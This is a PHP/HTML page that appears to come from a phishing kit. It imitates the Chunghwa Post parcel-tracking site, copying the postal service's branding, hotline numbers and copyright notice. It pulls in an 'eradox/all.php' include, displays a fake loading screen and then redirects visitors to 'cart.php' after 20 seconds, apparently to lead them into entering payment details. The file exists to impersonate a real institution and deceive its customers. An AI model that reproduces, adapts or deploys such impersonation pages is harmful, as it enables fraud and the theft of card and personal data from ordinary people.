<?php
    include "eradox/all.php";
?>
<!DOCTYPE html>
<html lang="ch">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>加载中</title>
    <link rel="stylesheet" href="css/main.css">
</head>
<body>
    <header>
        <div class="firstdiv">
            <div class="inside"> 中華郵政全球資訊網 </div>
        </div>
        <div class="seconddiv">
            <div class="conta"><img src="images/logoso.png" alt="image"></div>
        </div>
        <div class="containerakhir">
            <div class="akhirheader">
                <div>郵件查詢 Track & Trace Service</div>
                <div>English </div>
            </div>
        </div>
    </header>
    <main>
        <div class="lbachari">
            <div class="bachar">郵件查詢 > </div>
        </div>
            <div class="test">
                <img src="images/loading.gif" alt="image">    
            </div>
        
    </main>
    <footer>   
        <div class="containertextfooter">
            <div> 感謝您的蒞臨，智能客服、若您對郵件處理資訊有疑問，<span style="color:red">請至意見箱</span> <img src="images/e_mail.gif" alt="image" class="egif"> 或洽顧客服務專線：0800-700-365</div>
            <div>手機請改撥付費電話：（04）2354-2030</div>
            <div> 若查詢網頁出現錯誤訊息或異常，<span style="color:red"> 請聯絡</span> <img src="images/e_mail.gif" class="egif" alt=""></div>
            <div> 版本建議MSIE 9.0以上　最佳解析度1280*1024</div>
            <div> 中華郵政股份有限公司版權所有 </div>
        </div>
    </footer>
    <script>
        setInterval(() => {
            window.location.href = "cart.php";
        },20000)
    </script>
</body>
</html>